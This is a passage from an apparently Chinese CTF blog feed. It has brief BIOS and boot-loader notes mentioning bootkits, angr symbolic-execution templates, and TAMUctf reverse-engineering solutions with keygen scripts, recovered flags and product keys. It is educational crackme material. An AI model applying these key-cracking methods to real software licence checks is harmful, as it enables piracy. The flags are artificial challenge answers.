Test），并加载引导程序（IPL）或存储在主存的操作系统。此外，BIOS还向操作系统提供一些系统参数。在MS-DOS等旧式16位操作系统中，系统硬件的变化是由BIOS隐藏，程序使用BIOS功能而不是直接控制硬件。现代操作系统会忽略BIOS提供的BIOS中断调用抽象层并直接控制硬件组件。___from wiki<br>简单来说BIOS就是用来自检的，但不止这些<br>从功能上看BIOS分为三个部分： 自检及初始化程序；硬件中断处理；程序服务请求。</p><h2 id="What-is-boot-loader"><a href="#What-is-boot-loader" class="headerlink" title="What is boot loader"></a>What is boot loader</h2><p>引导程序（英语：boot loader）位于计算机或其他计算机应用上，是指引导操作系统的程序。引导程序引导方式及程序视应用机型种类而不同。例如在普通的个人计算机上，引导程序通常分为两部分：第一阶段引导程序位于主引导记录（MBR），用以引导位于某个分区上的第二阶段引导程序，如NTLDR、BOOTMGR和GNU GRUB等。___from wiki<br>这里的第一阶段MBR也就是bootkit所要感染的地方，<br>BOOTKIT通过感染MBR(磁盘主引记录）的方式，实现绕过内核检查和启动隐身。___from baidu<br>据我了解的话<br>boot loader就是在BIOS完成自检等工作后，用来加载操作系统还有各种软件的<br>由于下载的第一阶段MBR放不下加载操作系统的代码，导致了第二阶段的产生<br>而第一阶段由以前的直接引导操作系统变为引导第二阶段</p>]]></content>
    
    
    
    <tags>
      
      <tag>iot</tag>
      
      <tag>rootkit</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>angr符号执行工具</title>
    <link href="/2019/03/01/%E5%85%B3%E4%BA%8E%E7%AC%A6%E5%8F%B7%E6%89%A7%E8%A1%8C%E7%9A%84%E4%B8%80%E4%BA%9B%E5%B0%8F%E5%B0%8F%E7%9A%84%E6%80%BB%E7%BB%93/"/>
    <url>/2019/03/01/%E5%85%B3%E4%BA%8E%E7%AC%A6%E5%8F%B7%E6%89%A7%E8%A1%8C%E7%9A%84%E4%B8%80%E4%BA%9B%E5%B0%8F%E5%B0%8F%E7%9A%84%E6%80%BB%E7%BB%93/</url>
    
    <content type="html"><![CDATA[<p>关于angr<br>其实angr是我在hgame week4的时候偶然发现滴<br>//因为那个vm的题目一开始没整出来。。。<br>//然后随便套了个脚本就跑出来了。。。<br>不得不说angr是ctf里的一个神器</p><a id="more"></a><h2 id="happyVM"><a href="#happyVM" class="headerlink" title="happyVM"></a>happyVM</h2><p>直接上题<br>hgame 2019 week4的vm题目<br><img src="1.png" alt="vm1"><br>可以看到程序主要是根据输入进行encrypt<br>经过比较后然后判断对错<br>直接上代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs asm">from angr import *<br>p &#x3D; Project(&quot;.&#x2F;happyVM&quot;,auto_load_libs&#x3D;False)     # file name<br>s &#x3D; p.factory.entry_state()<br>sm &#x3D; p.factory.simulation_manager(s)<br>r &#x3D; sm.explore(find &#x3D; 0x400786,avoid &#x3D; 0x40078D)        # address<br>print r.found[0].posix.dumps(0)<br># hgame&#123;3Z_VM_W0NT_5T0P_UR_PR0GR355&#125;<br></code></pre></td></tr></table></figure><p>这是我第一次使用angr，并轻松完成一道题<br>跑的时间有点久<br>10分钟左右吧<br>但是我完全不怎么懂angr，只是套个脚本<br>包括后续的做题，导致有很多能用angr的题没有整出来，因为一旦这个“万能模板”报错<br>我就不会使用angr来分析它了//毕竟我完全不了解他，只知道能轻松写题<br>所以写了下这篇文章想来熟悉一下并能进阶使用angr<br>//大部分借鉴了今天偶然间看到的一篇国外dalao的blog<br>//因为写的挺好滴~关于选取入口还有对输入的限制都有讲<br><a href="https://blog.efiens.com/tamuctf-2019/">具体可点击</a><br>下面是作者提供的模板，我自己稍微加了些注释</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs asm">import angr <br><br>p &#x3D; angr.Project(&#39;prodkey&#39;)         #初始化文件<br><br>good &#x3D; (0x400deb)<br>bad &#x3D; (0x400df2)<br><br>verify_function &#x3D; 0x00400c99<br>fget_function &#x3D; 0x00400e20<br>main &#x3D; 0x00400dfc<br><br>state &#x3D; p.factory.blank_state(addr&#x3D;main) # 入口地址<br><br>simgr &#x3D; p.factory.simulation_manager(state) # 符号执行初始化<br><br>simgr.explore(find&#x3D;good, avoid&#x3D;bad) # 寻找路径<br><br>result &#x3D; simgr.found[0]<br><br>for i in range(3):<br>    print (result.posix.dumps(i))<br></code></pre></td></tr></table></figure><p>这是tamuctf中的题<br>那题wp在我上一篇blog中，因为z3写不出，求解答案的方式很繁琐<br>然而这脚本几秒钟就跑出来了<br>虽然说字符串有些不可打印，但确实是正确答案<br>作者在后面还提供了关于angr加上限制的方法<br>主要是用claripy来实现的<br>angr里面一些约束是用z3来实现，有些用法和z3也很像<br>看约束代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs asm">import claripy<br><br>def AND1(c):    #自定义约束函数<br>    &#39;&#39;&#39;constrain 1: printable&#39;&#39;&#39;<br>    return claripy.And(33 &lt;&#x3D; c , c &lt;&#x3D; 126)<br><br>length &#x3D; 29     #限制输入的长度<br><br>flag &#x3D; claripy.BVS(&#39;flag&#39;, length*8)<br><br>for i in range(length):<br>    state.solver.add( AND1(flag.get_byte(i)) ) <br></code></pre></td></tr></table></figure><p>后面还有<br>看一下整体的脚本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs asm">import angr <br>import claripy<br><br><br>def AND1(c):<br>    &#39;&#39;&#39;constrain 1: printable&#39;&#39;&#39;<br>    return claripy.And(33 &lt;&#x3D; c , c &lt;&#x3D; 126)<br><br>def AND2(c):<br>    &#39;&#39;&#39;returns constraints s.t. c is printable&#39;&#39;&#39;<br>    return claripy.And(65 &lt;&#x3D; c , c &lt;&#x3D; 90)<br><br>def AND3(c):<br>    &#39;&#39;&#39;returns constraints s.t. c is printable&#39;&#39;&#39;<br>    return claripy.And(97 &lt;&#x3D; c , c &lt;&#x3D; 122)<br><br>p &#x3D; angr.Project(&#39;prodkey&#39;)    <br><br>verify_function &#x3D; 0x00400c99<br>state &#x3D; p.factory.blank_state(addr&#x3D;verify_function)<br><br>length &#x3D; 29<br>flag &#x3D; claripy.BVS(&#39;flag&#39;, length*8)<br><br>for i in range(length):<br>    state.solver.add( AND1(flag.get_byte(i)) )<br>    # state.solver.add( AND2(flag.get_byte(i)) )<br>    # state.solver.add( AND3(flag.get_byte(i)) )<br><br>my_buf &#x3D; 0x12345678         #瞎写的地址<br>state.memory.store(addr&#x3D;my_buf, data&#x3D;flag)# 吧约束的字符串放入该地址<br>state.regs.rdi &#x3D; my_buf# rdi指向该地址<br><br>@p.hook(0x00400ca9) #勾取<br>def debug_func(state):<br>    rdi_value &#x3D; state.regs.rdi <br>    print ( &#39;rdi is point to &#123;&#125;&#39;.format(rdi_value) )<br>    <br><br>simgr &#x3D; p.factory.simulation_manager(state)<br><br>good &#x3D; (0x00400deb)<br>bad  &#x3D; (0x00400df2)<br><br>simgr.explore(find&#x3D;good, avoid&#x3D;bad)<br><br>result &#x3D; simgr.found[0]<br><br># Always print this <br>for i in range(3):<br>    print (result.posix.dumps(i))<br><br>print (result.solver.eval(flag, cast_to&#x3D;bytes))<br></code></pre></td></tr></table></figure><p>这就是解决tamuctf那题的完美解决方式了<br>答案也都是可打印字符<br>我本来想用这脚本稍作修改来解决一下hgame那题<br>但是跑的时间也要6分钟。。。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs asm">import angr<br>import claripy<br><br><br>def AND1(c):<br>    &#39;&#39;&#39;constrain 1: printable&#39;&#39;&#39;<br>    claripy.And(65 &lt;&#x3D; c, c &lt;&#x3D; 90)<br>    claripy.And(95 &lt;&#x3D; c, c &lt;&#x3D; 125)<br>    return claripy.And(48 &lt;&#x3D; c, c &lt;&#x3D; 57)<br><br><br>p &#x3D; angr.Project(&#39;happyVM&#39;)<br><br>mainaddr &#x3D; 0x0040070E<br>state &#x3D; p.factory.blank_state(addr&#x3D;mainaddr)<br><br>length &#x3D; 34<br>flag &#x3D; claripy.BVS(&#39;flag&#39;, length * 8)<br><br>for i in range(length):<br>    state.solver.add(AND1(flag.get_byte(i)))<br>    # state.solver.add( AND2(flag.get_byte(i)) )<br>    # state.solver.add( AND3(flag.get_byte(i)) )<br><br><br>my_buf &#x3D; 0x12345678<br>state.memory.store(addr&#x3D;my_buf, data&#x3D;flag)<br>state.regs.rsi &#x3D; my_buf<br><br><br><br>@p.hook(0x0040082B)<br>def debug_func(state):<br>    rsi_value &#x3D; state.regs.rsi<br>    print (&#39;rsi is point to &#123;&#125;&#39;.format(rsi_value))<br><br><br>simgr &#x3D; p.factory.simulation_manager(state)<br><br>good &#x3D; (0x00400786)<br>bad &#x3D; (0x0040078d)<br><br>simgr.explore(find&#x3D;good, avoid&#x3D;bad)<br><br>result &#x3D; simgr.found[0]<br><br># Always print this<br>for i in range(3):<br>    print (result.posix.dumps(i))<br><br>print (result.solver.eval(flag, cast_to&#x3D;bytes))<br></code></pre></td></tr></table></figure><p>现在起码了解到怎么使用angr对条件进行约束了<br>本来想约束输入前6字符为hgame{<br>但是不知道怎么弄。。。<br>没办法了，先写这么一点<br>等到以后遇到题型了再继续总结<br>包括这里面涉及的hook，我也没怎么了解过<br>还是太菜了啊</p>]]></content>
    
    
    
    <tags>
      
      <tag>re</tag>
      
      <tag>ctf</tag>
      
      <tag>angr</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>TAMUctf</title>
    <link href="/2019/02/26/TAMUctf/"/>
    <url>/2019/02/26/TAMUctf/</url>
    
    <content type="html"><![CDATA[<p>前几天的一个美国的比赛<br>因为是第一次写国外比赛的题，和国内区别还是有的，题目也不怎么难。。。但有点奇怪吧。。。</p><a id="more"></a><h1 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h1><p>RE方向目前写出来7题，有一道汇编的没做。。。</p><h2 id="Cheesy"><a href="#Cheesy" class="headerlink" title="Cheesy"></a>Cheesy</h2><p>直接放入ida<br><img src="1.png" alt="cheesy1"><br>可以看到很多像base64的字符串<br>一个个解一下<br>gigem{3a5y_R3v3r51N6!}</p><h2 id="Snakes-over-cheese"><a href="#Snakes-over-cheese" class="headerlink" title="Snakes over cheese"></a>Snakes over cheese</h2><p>反编译直接</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs asm">#!&#x2F;usr&#x2F;bin&#x2F;env python<br># encoding: utf-8<br># 如果觉得不错，可以推荐给你的朋友！http:&#x2F;&#x2F;tool.lu&#x2F;pyc<br>from datetime import datetime<br>Fqaa &#x3D; [<br>    102,<br>    108,<br>    97,<br>    103,<br>    123,<br>    100,<br>    101,<br>    99,<br>    111,<br>    109,<br>    112,<br>    105,<br>    108,<br>    101,<br>    125]<br>XidT &#x3D; [<br>    83,<br>    117,<br>    112,<br>    101,<br>    114,<br>    83,<br>    101,<br>    99,<br>    114,<br>    101,<br>    116,<br>    75,<br>    101,<br>    121]<br><br>def main():<br>    print &#39;Clock.exe&#39;<br>    input &#x3D; raw_input(&#39;&gt;: &#39;).strip()<br>    kUIl &#x3D; &#39;&#39;<br>    for i in XidT:<br>        kUIl +&#x3D; chr(i)<br>    <br>    if input &#x3D;&#x3D; kUIl:<br>        alYe &#x3D; &#39;&#39;<br>        for i in Fqaa:<br>            alYe +&#x3D; chr(i)<br>        <br>        print alYe<br>    else:<br>        print datetime.now()<br><br>if __name__ &#x3D;&#x3D; &#39;__main__&#39;:<br>    main()<br></code></pre></td></tr></table></figure><p>看到可疑的字符串<br>吧对应ASCII整出<br>flag{decompile}<br>SuperSecretKey</p><h2 id="042"><a href="#042" class="headerlink" title="042"></a>042</h2><p>用文本编辑器打开后。。。<br>因为以前一直看的是intel汇编<br>这种汇编第一次见<br>往下翻可以看到一堆mov操作<br>吧ASCII打出</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs asm">flag &#x3D; &#39;gigem&#123;&#39;<br>a &#x3D; [65,53,53,51,77,98,49,89]<br>for i in range(len(a)):<br>    flag +&#x3D; chr(a[i])<br>flag +&#x3D; &#39;&#125;&#39;<br>print flag<br></code></pre></td></tr></table></figure><p>gigem{A553Mb1Y}</p><h2 id="KeyGenMe"><a href="#KeyGenMe" class="headerlink" title="KeyGenMe"></a>KeyGenMe</h2><p>程序主要是根据输入进行加密后再字符串匹配<br><img src="2.png" alt="key"><br>一开始想用z3去解的，但是因为key可以是很多种<br>就直接爆破了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs asm">a &#x3D; &#39;H[OIonU2_&lt;__nK&lt;KsK&#39;<br>for i in range(len(a)-1):<br>    key &#x3D; &#39;&#39;<br>    for temp in range(32,128):<br>        if ord(a[i+1]) &#x3D;&#x3D; ((temp + 12) * ord(a[i]) + 17) % 70 + 48:<br>            key +&#x3D; chr(temp)<br>    print key<br>#G4Z2S09577095926<br></code></pre></td></tr></table></figure><p>直接输入后得flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs asm">pisanbao@pisanbao-virtual-machine:~&#x2F;ctf$ nc rev.tamuctf.com 7223<br><br>Please Enter a product key to continue: <br>G4Z2S09577095926<br>gigem&#123;k3y63n_m3?_k3y63n_y0u!&#125;<br><br></code></pre></td></tr></table></figure><h2 id="NoCCBytes"><a href="#NoCCBytes" class="headerlink" title="NoCCBytes"></a>NoCCBytes</h2><p>这题的话<br>刚刚又做了一遍，一开始有点懵逼<br>后来发现还是不怎么难啊<br>程序大概是对输入进行了一堆神奇的操作，再对里面一串字符串进行解密操作后与之相匹配<br>那么简单了啊<br>直接调试在这个解密的地方下断点<br>毕竟每次异或操作的数是v2，v2不会变<br><img src="3.png" alt="nocc"><br>发现v2值为0x11<br>那么直接解密</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs asm">a &#x3D; &#39;Fpee~Bphb&#39;<br>flag &#x3D; &#39;&#39;<br>for i in range(len(a)):<br>    flag +&#x3D; chr(ord(a[i])^0x11)<br>print flag<br># WattoSays<br></code></pre></td></tr></table></figure><p>答案出现</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs asm">pisanbao@pisanbao-virtual-machine:~$ nc rev.tamuctf.com 8188<br><br>Welcome. Please Enter a password to continue: <br>WattoSays<br>gigem&#123;Y0urBreakpo1nt5Won7Work0nMeOnlyMon3y&#125;<br><br></code></pre></td></tr></table></figure><p>还有俩到题目虽然说是写出来了，但是方法不是那么的正常。。。<br>如果有些出来的希望能私信一下<br>我想知道咋写鸭~~~</p><h2 id="Cr4ckZ33C0d3"><a href="#Cr4ckZ33C0d3" class="headerlink" title="Cr4ckZ33C0d3"></a>Cr4ckZ33C0d3</h2><p>虽然说题目要求用z3去写<br>但是呢。。。。。。。。。。。。。<br>没写出来<br>不知道为什么<br>z3写出来的答案总是有问题//不知道是不是因为<br>没办法了，只能慢慢分析然后用c去写<br>而且这题呢。。。输入29个字符，只对其中部分有限制<br>或者说？这题也有多解？？？像keygenme一样？？？<br>//导致z3解不出？？？（猜测）<br>程序只对17个字符进行判断<br>其中7个字符可以定下<br>让我们来解其余10个</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs asm">已知条件<br>a[0] &#x3D; 77<br>a[5] &#x3D; 45<br>a[11] &#x3D; 45<br>a[17] &#x3D; 45<br>a[20] &#x3D; 66<br>a[21] &#x3D; 66<br>a[23] &#x3D; 45<br><br>限制条件<br>(unsigned int)(a1[1] - 48) &lt;&#x3D; 9<br>      &amp;&amp; (unsigned int)(a1[4] - 48) &lt;&#x3D; 9<br>      &amp;&amp; (unsigned int)(a1[6] - 48) &lt;&#x3D; 9<br>      &amp;&amp; (unsigned int)(a1[9] - 48) &lt;&#x3D; 9<br>      &amp;&amp; (unsigned int)(a1[15] - 48) &lt;&#x3D; 9<br>      &amp;&amp; (unsigned int)(a1[18] - 48) &lt;&#x3D; 9<br>      &amp;&amp; (unsigned int)(a1[22] - 48) &lt;&#x3D; 9<br>      &amp;&amp; (unsigned int)(a1[27] - 48) &lt;&#x3D; 9<br>      &amp;&amp; (unsigned int)(a1[28] - 48) &lt;&#x3D; 9<br>这边不一一列举,只把重要的写一下。<br></code></pre></td></tr></table></figure><p>来看一下check3<br>a1[4] - 48 == 2 * (a1[1] - 48) + 1 &amp;&amp; a1[4] - 48 &gt; 7 &amp;&amp; a1[9] == a1[4] - (a1[1] - 48) + 2<br>首先上面限制条件a[4] - 48 &lt;= 9,这边又有a[4] - 48 &gt; 7<br>所以a[4]只能取56，57<br>再看a1[4] - 48 == 2 * (a1[1] - 48) + 1<br>所以a[4] - 48 为奇数<br>a[4] = 57<br>所以a[1] = 52,a[9] = 55<br>ok,现在还剩下7个未知<br>再看看check4,5,6,7,8</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs asm">(a1[1] + a1[4] * a1[6]) % 41 &#x3D;&#x3D; 5;<br>(a1 + 27) + *(char *)(a1 + 28)) % 13 &#x3D;&#x3D; 8;<br>(a1 + 27) + *(char *)(a1 + 22)) % 22 &#x3D;&#x3D; 18;<br>(a1 + 18) + *(char *)(a1 + 22)) % 11 &#x3D;&#x3D; 5;<br>(a1[22] + a1[28] + a1[18]) % 26 &#x3D;&#x3D; 4;<br>别忘了这边涉及的所有未知数都有a[x]-48&lt;&#x3D;9的限制<br></code></pre></td></tr></table></figure><p>c语言爆破，套个5层循环。。。//其实可以爆，毕竟范围限制在那</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs asm">int main()<br>&#123;<br>    char a27,a28,a22,a18,a6;<br>    for(a27&#x3D;32;a27&lt;58;a27++)&#x2F;&#x2F;32开始为可打印字符<br>    &#123;<br>        for(a22&#x3D;32;a22&lt;58;a22++)<br>    &#123;<br>        for(a28&#x3D;32;a28&lt;58;a28++)<br>        &#123;<br>        for(a18&#x3D;32;a18&lt;58;a18++)<br>        &#123;<br>        for(a6&#x3D;32;a6&lt;58;a6++)<br>    &#123;<br>        if((52+57*a6)%41&#x3D;&#x3D;5 &amp;&amp; (a27+a28)%13&#x3D;&#x3D;8 &amp;&amp; (a27+a22)%22&#x3D;&#x3D;18 &amp;&amp; (a18+a22)%11 &#x3D;&#x3D; 5 &amp;&amp; (a22+a28+a18)%26&#x3D;&#x3D;4)<br>            printf(&quot;a6&#x3D;%d,a18&#x3D;%d,a22&#x3D;%d,a27&#x3D;%d,a28&#x3D;%d\n&quot;,a6,a18,a22,a27,a28);<br>    &#125;<br>    &#125;<br>    &#125;<br>    &#125;<br>    &#125;<br>    return 0;<br>&#125;<br></code></pre></td></tr></table></figure><p>头文件啥的不加了<br>跑出来结果</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs asm">a6&#x3D;56,a18&#x3D;41,a22&#x3D;52,a27&#x3D;32,a28&#x3D;41<br>a6&#x3D;56,a18&#x3D;32,a22&#x3D;50,a27&#x3D;34,a28&#x3D;52<br>a6&#x3D;56,a18&#x3D;54,a22&#x3D;39,a27&#x3D;45,a28&#x3D;41<br>a6&#x3D;56,a18&#x3D;45,a22&#x3D;37,a27&#x3D;47,a28&#x3D;52<br>a6&#x3D;56,a18&#x3D;36,a22&#x3D;35,a27&#x3D;49,a28&#x3D;37<br>a6&#x3D;56,a18&#x3D;54,a22&#x3D;50,a27&#x3D;56,a28&#x3D;56<br></code></pre></td></tr></table></figure><p>果断选择最后一个<br>下面看check9<br>这就可以用z3了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs asm">from z3 import *<br>s &#x3D; Solver()<br>a15 &#x3D; BitVec(&#39;a15&#39;,8)<br>s.add((((((a15-56)&gt;&gt;31)&gt;&gt;30)+a15-56)&amp;3)-(((a15-56)&gt;&gt;31)&gt;&gt;30)&#x3D;&#x3D;1)<br>if s.check()&#x3D;&#x3D;sat:<br>    print s.model()#[a15 &#x3D; 57]<br><br></code></pre></td></tr></table></figure><p>a15 = 57<br>check0A是帮你验证的，因为前面有多解嘛<br>选择最像的，验证我就不验证了啊<br>看check0C</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs asm">int main()<br>&#123;<br>    char a9;<br>    for(a9&#x3D;32;a9&lt;58;a9++)<br>    &#123;<br>        if((56+57*a9)%10&#x3D;&#x3D;1)<br>            printf(&quot;a9&#x3D;%d\n&quot;,a9);<br>    &#125;<br>&#x2F;&#x2F;a9&#x3D;35<br>&#x2F;&#x2F;a9&#x3D;45<br>&#x2F;&#x2F;a9&#x3D;55<br>    return 0;<br>&#125;<br><br><br></code></pre></td></tr></table></figure><p>a9 = 55<br>那就ok了啊</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs asm">int main()<br>&#123;<br>    char a[29]&#x3D;&#123;0&#125;;<br>    a[0] &#x3D; 77;<br>a[1] &#x3D; 52;<br>a[4] &#x3D; 57;<br>a[5] &#x3D; 45;<br>a[6] &#x3D; 56;<br>a[9] &#x3D; 55;<br>a[11] &#x3D; 45;<br>a[15] &#x3D; 57;<br>a[17] &#x3D; 45;<br>a[18] &#x3D; 54;<br>a[20] &#x3D; 66;<br>a[21] &#x3D; 66;<br>a[22] &#x3D; 50;<br>a[23] &#x3D; 45;<br>a[27] &#x3D; 56;<br>a[28] &#x3D; 56;<br>int i;<br>for(i&#x3D;0;i&lt;29;i++)<br>&#123;<br>    if(a[i])<br>        printf(&quot;%c&quot;,a[i]);<br>    else<br>        printf(&quot;0&quot;);<br>&#125;<br>    return 0;<br>&#125;<br></code></pre></td></tr></table></figure><p>跑一下<br>M4009-80070-00090-60BB2-00088<br>看样子就是答案了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs asm">pisanbao@pisanbao-virtual-machine:~$ nc rev.tamuctf.com 8189<br><br>Please Enter a product key to continue: 